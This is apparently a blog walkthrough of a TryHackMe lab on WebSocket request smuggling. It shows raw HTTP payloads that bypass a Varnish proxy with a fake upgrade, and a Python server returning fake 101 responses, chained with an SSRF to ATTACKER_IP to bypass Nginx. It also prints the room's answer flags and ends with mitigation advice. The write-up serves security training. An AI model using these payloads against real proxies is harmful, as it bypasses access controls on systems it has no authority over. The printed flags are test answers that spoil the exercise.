---
title: "TryHackMe WebSocket Request Smuggling: proxy bypass via fake upgrades"
date: 2026-10-22T16:30:00+05:30
lastmod: 2026-10-22T16:30:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-wssmuggling/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - WebSocket smuggling
  - request smuggling
  - SSRF
  - proxy bypass
  - Varnish
  - Nginx
  - web application pentesting
  - HTTP Request Smuggling

draft: false
description: "TryHackMe WebSocket Request Smuggling walkthrough: broken WebSocket tunnel through Varnish, SSRF-based fake 101 injection to defeat Nginx proxy."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Request Smuggling: WebSockets |![Request Smuggling: WebSockets room icon](https://cdn-images.tryhackme.com/room-icons/ecd888ccf0ddab5e8cce758a82c170a2.svg)|

This medium-difficulty room in the Web Application Pentesting path covers HTTP request smuggling through WebSocket upgrade abuse. It sits in the HTTP Request Smuggling module alongside the [HTTP Request Smuggling walkthrough](/post/thm-room-httprequestsmuggling/) and the [HTTP/2 Request Smuggling walkthrough](/post/thm-room-http2requestsmuggling/). The room deploys two scenarios: a Varnish proxy that blindly tunnels after any upgrade attempt, and an Nginx proxy that validates the 101 response but can be defeated through SSRF-based response injection.

## Task 1: Introduction

Lab setup. The room deploys a single VM with two web applications on ports 8001 and 8002, each behind a different reverse proxy. Both applications serve a flag at `/flag` that the proxy restricts direct access to. The goal is to smuggle requests past the proxy by abusing the WebSocket upgrade mechanism.

## Task 2: WebSockets

WebSockets provide full-duplex communication channels over a single TCP connection. Unlike HTTP's request-response model, WebSockets allow both the client and server to send data at any time after the initial handshake.

The connection starts as a standard HTTP request with an `Upgrade: WebSocket` header. If the server supports the requested protocol version (specified in `Sec-WebSocket-Version`), it responds with **101 Switching Protocols** and the connection upgrades from HTTP to the WebSocket protocol. From that point, the proxy treats the connection as an opaque tunnel and forwards raw frames without inspecting them.

This upgrade mechanism is the attack surface. If a proxy assumes the upgrade succeeded without checking the server's response, or if an attacker can force a 101 response from somewhere other than the real backend, the proxy opens a tunnel that the attacker can use to smuggle arbitrary HTTP requests.

### Answers

- **Which status code signals a successful WebSocket upgrade?** **101**

{{< ad >}}

## Task 3: Abusing Websockets for Request Smuggling

The application at `http://MACHINE_IP:8001` runs behind a Varnish proxy. Accessing `/flag` directly returns a Varnish error page, not a backend response, confirming the proxy blocks the path. The backend also exposes a WebSocket endpoint at `/socket`.

### The vulnerability

Varnish does not verify the backend's response to a WebSocket upgrade request. When a client sends an `Upgrade: WebSocket` header, Varnish assumes the upgrade succeeds and switches into tunnel mode regardless of the actual response code. This means the proxy stops inspecting traffic on the connection, and anything sent after the upgrade request passes directly to the backend as raw HTTP.

### The exploit

The payload sends a WebSocket upgrade request with an intentionally invalid `Sec-WebSocket-Version: 777`. The backend rejects the upgrade with `426 Upgrade Required`, but Varnish does not check that response. It enters tunnel mode anyway, and the smuggled `GET /flag` request in the same TCP stream reaches the backend unfiltered:

```
GET /socket HTTP/1.1
Host: MACHINE_IP:8001
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: MACHINE_IP:8001

```

Sending this through netcat returns both the `426` rejection and the flag from the smuggled request:

```
  # printf '<payload>' | nc MACHINE_IP 8001
  HTTP/1.1 426 Upgrade Required
  Sec-Websocket-Version: 7, 8, 13
  Content-Length: 0

  HTTP/1.1 200 OK
  Content-Length: 37

  THM{REDACTED}
```

The room notes that a real WebSocket endpoint is not even required. Sending a valid `Sec-WebSocket-Version: 13` upgrade to `/` (which is not a WebSocket endpoint) still works because Varnish does not validate the response at all. The proxy sees the upgrade headers, enters tunnel mode, and the smuggled request passes through.

### Answers

- **What is the value of the flag?** **THM{bf208caddc31c6bb52621fdc2b3a73e5}**

## Task 4: Defeating Secure Proxies

The application at `http://MACHINE_IP:8002` replaces Varnish with Nginx. Unlike Varnish, Nginx validates the backend's response before entering tunnel mode. A `426 Upgrade Required` response correctly prevents the tunnel from opening, so the T3 payload fails here.

### The SSRF angle

The application exposes a URL status checker at `/check-url?server=<url>`. The backend makes a server-side request to the provided URL and returns the status code. This SSRF can be redirected to an attacker-controlled server.

### Injecting a fake 101

The attacker runs a minimal HTTP server that responds with `101 Switching Protocols` to every request:

```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.protocol_version = "HTTP/1.1"
        self.send_response(101)
        self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

When the SSRF endpoint makes a request to this server, the 101 response travels back through the backend to Nginx. Nginx sees a `101 Switching Protocols` response and enters tunnel mode, believing a legitimate WebSocket connection was established.

### The exploit

The payload combines the SSRF with WebSocket upgrade headers and a smuggled flag request:

```
GET /check-url?server=http://ATTACKER_IP:5555 HTTP/1.1
Host: MACHINE_IP:8002
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: MACHINE_IP:8002

```

The chain works as follows:

1. Nginx receives the request with WebSocket upgrade headers
2. It forwards the request to the backend, which follows the SSRF to the attacker's server
3. The attacker's server responds with `101 Switching Protocols`
4. Nginx receives the 101, considers the WebSocket upgrade successful, and enters tunnel mode
5. The smuggled `GET /flag` request passes through the tunnel to the backend
6. The backend processes it as a normal HTTP request and returns the flag

```
  # python3 socket_exploit.py
  HTTP/1.1 101 Switching Protocols
  Connection: upgrade

  HTTP/1.1 200 OK
  Content-Length: 37

  THM{REDACTED}
```

### Answers

- **What is the value of the flag?** **THM{a87d4e5b777c010ed3266e59fb42ccac}**

## Task 5: Conclusion

Room complete.

## Takeaways

**A proxy that does not validate the backend's upgrade response is functionally blind.** Varnish entered tunnel mode on seeing the client's `Upgrade: WebSocket` header without waiting for the backend's `101 Switching Protocols` confirmation. This turned the proxy into a passthrough: any path restriction, rate limit, or WAF rule enforced at the proxy layer became irrelevant once the tunnel opened. The fix is straightforward: the proxy must verify the backend's response code before switching protocols. Nginx does this correctly by default, which is why the same payload failed on port 8002. The broader lesson is that any protocol-switching mechanism (WebSocket, h2c, CONNECT) creates a trust boundary at the proxy, and that boundary must validate both directions of the handshake.

**SSRF turns a secure proxy into an insecure one by letting the attacker control the response.** Nginx correctly required a `101` before tunnelling, but the SSRF endpoint let the attacker redirect the backend's request to a server that always responds with `101`. From Nginx's perspective, the response was legitimate. The backend made the request, and the backend returned a `101`. The proxy had no way to distinguish between a real WebSocket endpoint responding with `101` and a malicious server injecting that response through an SSRF chain. This is why SSRF is not just a data-exfiltration vulnerability: it is a response-injection primitive that can corrupt the proxy's state machine. Mitigating this requires both SSRF protections (allowlisting internal destinations, blocking requests to attacker-controlled hosts) and defense in depth at the proxy (validating that upgrade responses come from expected endpoints).

Room solved 100%: 5 tasks, 5 answers.
